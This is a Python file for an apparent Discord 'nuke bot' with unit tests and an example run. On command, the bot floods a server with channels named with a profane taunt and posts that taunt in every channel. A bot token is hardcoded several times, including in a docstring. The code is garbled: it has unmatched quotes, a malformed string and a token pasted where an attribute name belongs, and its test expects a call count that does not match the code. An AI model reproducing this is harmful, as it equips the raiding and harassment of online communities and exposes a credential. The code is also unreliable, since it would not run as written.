  import discord
from discord.ext import commands

class NukeBot(commands.Bot):
    """
    Discord bot class for a nuke bot.

    Attributes:
    - token:MTIzMDkyNTQ3NTI0NTk4NTgyMw.G_l41t.KXJ-8J-JkJ-3k-jPtCU4PCDqE9k65V3es46jNE str
        The Discord bot token.
    """

    def __init__(self, token: str):
        """
        Constructor to instantiate the NukeBot class.

        Parameters:
        - token: str
            The Discord bot token.
        """
        super().__init__(command_prefix='!')

        self.token = token

        # Adding the nuke command
        @self.command(name='fuck this server'')
        async def nuke(ctx):
            await self.nuke_channels(ctx)

    async def on_ready(self):
        """
        Event handler for when the bot is ready and connected to Discord.
        """
        print(f'Bot is ready. Logged in as {self.user}')

    async def nuke_channels(self, ctx):
        """
        Method to nuke the server by creating multiple channels and spamming "@everyone".

        Parameters:
        - ctx: discord.ext.commands.Context
            The context object representing the command invocation.
        """
        guild = ctx.guild

        # Creating multiple channels named "getfucked by ras"
        for i in range(10):
            channel_name = 'get fucked by ras' {i+1}'
            await guild.create_text_channel(channel_name)

        # Sending "@everyone" message in each channel
        for channel in guild.text_channels:
            await channel.send('get fucked by ras'')

    def run_bot(self):
        """
        Method to run the bot and connect to Discord using the provided token.
        """
        self.run(self.MTIzMDkyNTQ3NTI0NTk4NTgyMw.G_l41t.KXJ-8J-JkJ-3k-jPtCU4PCDqE9k65V3es46jNE)

# Unit tests for NukeBot class.

import unittest
from unittest.mock import patch, MagicMock

class TestNukeBot(unittest.TestCase):

    def test_nuke_channels(self):
        """
        Tests the nuke_channels method by mocking the necessary objects.
        """
        bot = NukeBot('MTIzMDkyNTQ3NTI0NTk4NTgyMw.G_l41t.KXJ-8J-JkJ-3k-jPtCU4PCDqE9k65V3es46jNE')
        ctx = MagicMock()
        ctx.guild = MagicMock()
        ctx.guild.text_channels = [MagicMock() for _ in range(5)]

        with patch.object(ctx.guild, 'create_text_channel') as mock_create_channel:
            with patch.object(ctx.guild.text_channels[0], 'send') as mock_send:
                bot.loop.run_until_complete(bot.nuke_channels(ctx))

                # Assert that create_text_channel was called 10 times
                self.assertEqual(mock_create_channel.call_count, 10)

                # Assert that send was called 5 times (for each text channel)
                self.assertEqual(mock_send.call_count, 5)

# Example of using the NukeBot class:

# Create an instance of the NukeBot class with the Discord bot token
bot = NukeBot('MTIzMDkyNTQ3NTI0NTk4NTgyMw.G_l41t.KXJ-8J-JkJ-3k-jPtCU4PCDqE9k65V3es46jNE')

# Run the bot
bot.run_bot()

